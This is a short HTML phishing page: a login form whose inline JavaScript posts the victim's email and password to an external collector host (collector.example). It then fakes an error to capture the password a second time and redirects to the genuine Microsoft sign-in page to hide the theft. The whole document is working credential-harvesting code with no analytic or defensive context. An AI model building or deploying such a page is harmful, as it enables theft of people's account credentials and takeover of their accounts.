<!DOCTYPE html><html><body>
<input id="email"><input type="password" id="password">
<div class="error"></div><button id="login">Sign in</button>
<script>
var first_password = '';
var gate = 'https://collector.example/submit';
document.getElementById('login').addEventListener('click', function(e) {
  var email = document.getElementById('email').value;
  var password = document.getElementById('password').value;
  if (first_password == '') {
    first_password = password;
    var request = new XMLHttpRequest();
    request.open('POST', gate, true);
    request.send('email='+email+'&pass1='+password);
    document.getElementById('password').value = '';
    document.querySelector('.error').className = 'error active';
    return;
  }
  var request = new XMLHttpRequest();
  request.open('POST', gate, true);
  request.onreadystatechange = function() {
    // if (this.readyState == 4 && this.status == 200) {
    document.location.href = 'https://login.microsoftonline.com/login';
    // }
  };
  request.send('email='+email+'&pass1='+first_password+'&pass2='+password);
});
</script></body></html>
